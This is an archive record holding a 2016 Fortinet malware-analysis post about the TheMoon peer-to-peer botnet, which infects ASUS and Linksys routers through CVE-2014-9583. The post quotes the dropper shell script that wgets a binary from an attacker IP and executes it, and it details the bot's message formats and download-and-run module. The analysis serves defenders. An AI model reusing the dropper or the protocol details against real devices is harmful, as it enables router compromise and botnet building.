{
    "id": "98ffcc08-eb6a-4d82-b007-351edc8e3cfd",
    "created_at": "2023-01-12T15:00:18.319806Z",
    "updated_at": "2025-03-27T02:05:57.080069Z",
    "deleted_at": null,
    "sha1_hash": "b929b590d66ca6fdefbb9c38343ce8ea87aaece4",
    "title": "2016-10-20 - TheMoon - A P2P botnet targeting Home Routers",
    "authors": "",
    "file_creation_date": "2022-05-28T15:17:07Z",
    "file_modification_date": "2022-05-28T15:17:07Z",
    "file_size": 336015,
    "plain_text": "# TheMoon - A P2P botnet targeting Home Routers\n\n**[fortinet.com/blog/threat-research/themoon-a-p2p-botnet-targeting-home-routers](https://www.fortinet.com/blog/threat-research/themoon-a-p2p-botnet-targeting-home-routers)**\n\nThreat Research\n\n\nOctober 20, 2016\n\n\nBy [Bing Liu | October 20, 2016](https://www.fortinet.com/blog/search?author=Bing+Liu)\n[In the post “Home Routers - New Favorite of Cybercriminals in 2016”, we discussed the](https://blog.fortinet.com/2016/10/12/home-routers-new-favorite-of-cybercriminals-in-2016)\nactive detection of vulnerability CVE-2014-9583 in ASUS routers since June of this year. In\nthis post we will dissect a bot installed on the affected ASUS routers.\n\nThe following figure shows attack traffic captured through Wireshark.\n\n\n-----\n\nFigure 1 Exploitation of CVE-2014-9583\n\nBelow is the content of file nmlt1.sh downloaded from hxxp://78.128.92.137:80/.\n\n#!/bin/sh\n\ncd /tmp\n\nrm -f .nttpd\n\nwget -O .nttpd http://78.128.92.137/.nttpd,17-mips-le-t1\n\nchmod +x .nttpd\n\n./.nttpd\n\nThe vulnerable ASUS router will download and execute the binary file .nttpd from the\nattacker controlled website. The following figure shows its MD5 hash and file attributes:\n\nFigure 2 md5sum and file attributes\n\n\n-----\n\n[A simple search shows that this bot was analyzed here. However, that analysis was based](https://vms.drweb-av.pl/virus/?i=7936862&lng=en)\non sample MD5: c44f2d8ad37c18ea84a99db584d6992d, and some parts are misleading, so\nwe want to share our updated findings in this post.\n\nThis bot belongs to the TheMoon family of malware, which shares the following program\nstructure.\n\nFigure 3 Program structure of TheMoon family\n\nThe differences between the family members are mainly located in functions os_init and\nrun_modules.\n\nThis bot inserts the following eight iptables rules in function os_init.\n\n\n-----\n\nFigure 3 iptables rules\n\nThe first rule stops other attackers from exploiting the ASUS vulnerability CVE-2014-9583,\nwhile the second one stops other attackers from exploiting the Linksys Unauthenticated\nRemote Code Execution vulnerability.\n\nAll the rest ensure that the attacker has access to this router. We will talk about hard-coded\npeers later in this post.\n\nIn the function run_modules, this bot launches three modules: “clk,” “net” and “dwl.” Let’s\nanalyze them one by one.\n\n## Clk Module\n\nThis module launchs two threads. The first one calculates the running time while the second\none maintains the time. This bot queries public NTP servers for the UTC time, as shown in\nthe following figure.\n\nFigure 4 Hard-coded NTP servers\n\nThe following figure shows an NTP request sent by this bot, and the response from the\npublic NTP server.\n\n\n-----\n\nFigure 5 NTP request and response\n\n[We don’t believe that these hard-coded IP addresses are C&C servers, as was claimed here.](https://vms.drweb-av.pl/virus/?i=7936862&lng=en)\n\nIf the NTP query fails, the bot will instead use the local time.\n\n## Net Module\n\nThis module adds an iptables rule to open UDP port 5143, and then creates a thread which\nis responsible for P2P communication. It is worth mentioning that the supported message\ntypes are variant-specific, and usually different port numbers are used for communication.\n\nThis bot supports following three types of message.\n\n1. Register message\n2. RegisterTo message\n3. FetchCommand message\n\nEvery message contains a header and a body. All these messages share the following\nheader structure:\n\nOffset          Size          Description\n\n0                 1          Body length\n\n1                 1          Message Type\n\n2                 1          TTL\n\n3                 1          0x8F (variant specific)\n\nFor every received message, the bot decreases the TTL by one, and forwards the\nmessage to its peers if the result is not zero. The following figure demonstrates this\nbehavior.\n\n\n-----\n\nFigure 6 Forwarded message to its peers\n\n1. Register message\n\nThe type value of this message is 0. The bot sends this message to hard-coded peers after\nlaunching three modules successfully.\n\n\n-----\n\nFigure 7 register to hard-coded peers\n\nAs you may remember, iptables rules are installed to allow access to these hard-coded\npeers. The following figure shows the traffic sent to hard-coded peers:\n\nFigure 8 Register message\n\nThe message body is comprised of two double words: The first one is 0x6d6163f4 (variant\nspecific) and the second is the property value of this peer. The bot adds the sender as its\npeer after receiving this message. This bot supports 0x64 peers at maximum.\n\n1. RegistertTo\n\n\n-----\n\nThe type value of this message is zero as well, but the message body is 12 bytes long. If the\nthird double word is not zero, this bot sends a register message to a specified IP. Otherwise,\nit sends the register message to the sender. The following figure shows a RegisterTo\nmessage received by the bot.\n\nFigure 9 RegisterTo message\n\n1. FetchCommand\n\nThe type value of this message is one. The following is the structure of the message body.\n\nOffset          Size          Description\n\n0               4            Peer IP address\n\n4               4             Command id\n\n8               4             Command size (Maximum 0x19001)\n\n12              n             file name(n<=8)\n\nThe following figure shows a FetchCommand message received by this bot.\n\n\n-----\n\nFigure 10 FetchCommand message\n\nIf the sender is its peer, the bot stores the message in the following structure for the dwl\nmodule:\n\nStruct PendingCommand\n\n{\n\nDWORD ip;\n\nDWORD cmd_id;\n\nDWORD cmd_size;\n\nCHAR filename[8];\n\n};\n\n## Dwl Module\n\nThis module creates a thread which is responsible for handling the PendingCommand\ninformation created by the net module. This bot connects to TCP port 4543 of the designated\nIP and sends it the required file name and command id. The following figure shows the traffic\ncaptured through Wireshark:\n\n\n-----\n\nFigure 11 Command request\n\nThe designed IP is supposed to return the requested file. The bot stores the response in the\nspecified file and executes it. The following figure shows a sequence of calls that create and\nexecute the file received:\n\n\n-----\n\n<\n\nFigure 12 download and execute command\n\nWhile we were unable to download a command file for analysis at the time of this post,\nbased on the file name and size we monitor, they should be the TheMoon family members.\n\n## Conclusion\n\n[The TheMoon family was first discovered by SANS ISC in 2014. This family targets routers](https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Summary+What+we+know+so+far/17633/)\nand installs malware by exploiting their vulnerabilities. This bot is used on ASUS and Linksys\nrouters based on their hard-coded iptables rules.\n\nWe also discovered that its P2P communication is not as mature as its peers on PCs. For\nexample, instead of using digital signing, the botmaster uses iptables to ensure only he can\ncommand the bots. Unfortunately, or fortunately, these rules can be bypassed. In addition,\n\n\n-----\n\nthe communication is not encrypted, which leads to easier analysis and detection.\n\nFortinet released following detections for this bot:\n\nAV: Linux/Agent.B!tr.bdr\n\nAppCtrl: TheMoon.Botnet\n\n## Related Posts\n\nCopyright © 2022 Fortinet, Inc. All Rights Reserved\n\n[Terms of ServicesPrivacy Policy](https://www.fortinet.com/corporate/about-us/legal.html)\n| Cookie Settings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-10-20 - TheMoon - A P2P botnet targeting Home Routers.pdf"
    ],
    "report_names": [
        "2016-10-20 - TheMoon - A P2P botnet targeting Home Routers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535618,
    "ts_updated_at": 1743041157,
    "ts_creation_date": 1653751027,
    "ts_modification_date": 1653751027,
    "files": {
        "pdf": "https://archive.orkl.eu/b929b590d66ca6fdefbb9c38343ce8ea87aaece4.pdf",
        "text": "https://archive.orkl.eu/b929b590d66ca6fdefbb9c38343ce8ea87aaece4.txt",
        "img": "https://archive.orkl.eu/b929b590d66ca6fdefbb9c38343ce8ea87aaece4.jpg"
    }
}